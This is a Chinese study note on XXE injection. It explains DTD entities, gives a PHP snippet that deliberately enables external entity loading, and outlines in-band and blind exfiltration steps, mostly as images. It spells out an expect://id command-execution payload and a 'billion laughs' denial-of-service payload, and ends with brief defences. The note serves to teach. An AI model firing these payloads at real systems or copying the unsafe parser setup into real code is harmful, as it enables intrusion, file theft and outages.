# XXE(XML外部实体注入)

## 目录

- [XXE(XML外部实体注入)](#xxexml外部实体注入)
  - [目录](#目录)
  - [XML(可拓展标记语言)](#xml可拓展标记语言)
    - [XML格式与DTD](#xml格式与dtd)
  - [产生原因](#产生原因)
  - [漏洞挖掘与判断](#漏洞挖掘与判断)
  - [漏洞利用](#漏洞利用)
    - [XML实体支持的协议](#xml实体支持的协议)
    - [有回显](#有回显)
      - [内部DTD+外部普通实体](#内部dtd外部普通实体)
      - [外部DTD+参数实体](#外部dtd参数实体)
    - [无回显(盲打)](#无回显盲打)
      - [外部DTD+参数实体的递归调用](#外部dtd参数实体的递归调用)
    - [其他利用](#其他利用)
  - [漏洞防御](#漏洞防御)
  - [相关工具](#相关工具)


## XML(可拓展标记语言)
### XML格式与DTD

- DTD是文档类型定义，约束XML书写规范
- DTD分类
  - 外部DTD(DTD是单独的.dtd文件)
  - 内部DTD(DTD与XML写在一起)

- DTD实体(类似于变量)
  - 内部普通实体
  - 外部普通实体
- 参数实体(实体定义时需要在实体前加%)
  - 内部参数实体
  - 外部参数实体
- 内部外部区别
    - 是否有url/uri
    - 外部实体定义需要在实体后加SYSTEM

```xml
<!-- 声明xml格式、版本及编码 -->
<?xml version = "1.0" encoding = "UTF-8">

<!-- neibuDTD -->
<!DOCTYPE neibuDTD[

    <!-- 内部普通实体 -->
    <!ENTITY aaa "lalala">
    <!-- 外部普通实体调用用外部DTD -->
    <!ENTITY bbb SYSTEM "http://127.0.0.1/xxx.dtd">
    <!-- 内部参数实体 -->
    <!ENTITY % ccc "hahaha">
    <!-- 外部参数实体调用外部DTD -->
    <!ENTITY % ddd SYSTEM "http://127.0.0.1/yyy.dtd">

    <!-- 参数实体调用必须写在DTD中 -->
    &ccc;
    &ddd;

    <!-- 也可以重新定义一个普通实体eee引用参数实体ccc，普通实体eee值为参数实体ccc -->
    <!ENTITY eee "%ccc;">
]>

<!-- XML -->
<!-- 普通实体在XML中调用 -->
<books>
    &aaa;
    &bbb;
    &eee;
</books>
```

## 产生原因
- 允许传入xml
- 开启了外部实体加载
```php
<?php
    //libxml_disable_entity_loader (true)为关闭外部实体加载
    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom);
    echo $creds;
?>
```
## 漏洞挖掘与判断
- 服务器能够解析xml
  - html请求头Content-Type: application/xml
- 服务器允许传入任意的xml
  - 随机写xml或者是写一个错的xml，看响应消息有没有变化或报错
- 服务器允许外部实体加载
  - libxml_disable_entity_loader (false);

## 漏洞利用
### XML实体支持的协议

|PHP|Java|.NET|libxml2
|:---:|:---:|:---:|:---:
|http|http|http|http
|ftp|ftp|ftp|ftp
|file|file|file
|data|https|https|
|php|jar
|glob|netdoc
|phar|mailto
|compress.zlib|gppher*
|compress.zlibp2

### 有回显
#### 内部DTD+外部普通实体
- 1.直接在xml中的内部dtd中定义一个外部实体，外部实体的值就是伪协议payload
- 2.在xml中调用外部实体即可
  
  ![](..\img\XXE\2022-06-14-00-08-14.png)

#### 外部DTD+参数实体
- 1.在xml内部DTD中定义一个外部参数实体，实体的值是外部DTD的url   
- 2.在外部DTD文件中，定义一个外部实体，实体值是伪协议payload  
- 3.在内部DTD中引用参数实体，在xml中引用外部DTD的外部实体
  
  ![](..\img\XXE\2022-06-14-00-27-43.png)
  ![](..\img\XXE\2022-06-14-00-09-09.png)

### 无回显(盲打)
#### 外部DTD+参数实体的递归调用
- 1.在xml内部DTD中定义一个外部参数实体，实体的值是外部DTD的url
- 2.在外部DTD文件中，定义一个外部参数实体，实体的值是伪协议payload
- 3.在外部DTD文件中，再次定义一个参数实体，参数实体的值 再定义一个外部参数实体，外部参数实体的值是url外带拼接（url+第2步参数实体的调用）
- 4.在xml内部DTD中，分别调用三个外部参数实体，分别是 第1步的外部参数实体和 第3步创建的两个参数实体

  ![](..\img\XXE\2022-06-14-00-30-02.png)

  ![](..\img\XXE\2022-06-14-00-29-05.png)

- 开启监听接收数据
  
  ![](..\img\XXE\2022-06-14-00-32-05.png)

- base64解密
  ![](..\img\XXE\2022-06-14-00-32-29.png) 

### 其他利用
- 命令执行
```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ELEMENT  ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<root>&xxe;</root>
```
- DDOS攻击
```xml
  <?xml version="1.0"?>
     <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
     <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
     <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
     <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
     <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
     <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
     <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
     ]>
<lolz>&lol9;</lolz>
```
- [xxe双重实体编码绕过waf](https://www.qqxiuzi.cn/bianma/zifushiti.php)

## 漏洞防御
- 1.过滤敏感的标签
- 2.禁用外部实体加载libxml_disable_entity_loader (true);

## 相关工具
- [Xxer](https://github.com/TheTwitchy/xxer )
